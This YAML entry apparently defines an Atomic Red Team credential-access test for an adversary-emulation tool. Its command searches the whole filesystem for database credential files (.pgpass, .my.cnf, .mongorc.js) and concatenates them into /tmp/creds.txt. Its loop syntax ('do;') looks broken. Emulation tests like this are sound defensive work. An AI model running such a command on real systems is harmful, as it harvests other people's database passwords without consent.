- id: e62bccc4-0200-47e9-b40a-4ea5328495b3
  name: Find database credential files
  description: Find user-level database credential files. Examples include ~/.pgpass,
    ~/.my.cnf, and ~/.mongorc.js.
  tactic: credential-access
  technique:
    attack_id: T1552.001
    name: 'Unsecured Credentials: Credentials In Files'
  platforms:
    darwin:
      sh:
        command: for filename in .pgpass .my.cnf .mongorc.js; do; find / -name "$filename"
          -type f -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
          _ {} \; 2>/dev/null; done
        cleanup: rm -f /tmp/creds.txt
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - atomic-red-team
  - t1552.001
  - credential-access
  author: Atomic Red Team
  additional_info:
    input_arguments:
      file_path:
        description: Path to search
        type: string
        default: /
      filenames:
        description: Space-separated database credential filenames to search for
        type: string
        default: .pgpass .my.cnf .mongorc.js
      optional_flags:
        description: optional flags passed into find that should be ran
        type: string
        default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
          _ {} \;
    technique_created: '2020-02-04T12:52:13.006Z'
    atomic_guid: e62bccc4-0200-47e9-b40a-4ea5328495b3
    import_timestamp: '2026-09-05T06:40:49.905773Z'
